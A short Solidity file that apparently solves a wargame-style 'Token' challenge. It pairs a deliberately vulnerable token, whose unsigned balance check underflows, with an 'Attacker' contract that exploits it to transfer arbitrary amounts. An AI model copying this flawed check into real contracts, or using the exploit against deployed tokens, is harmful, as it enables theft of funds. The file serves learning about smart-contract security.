// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

// The victim Contract
contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0, "Not Enough to achieve this");
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}


//The attacker Contract
contract Attacker{
  function transferTo(address _victim, address _attacker, uint _amount) public {
    Token(_victim).transfer(_attacker, _amount);
  }
}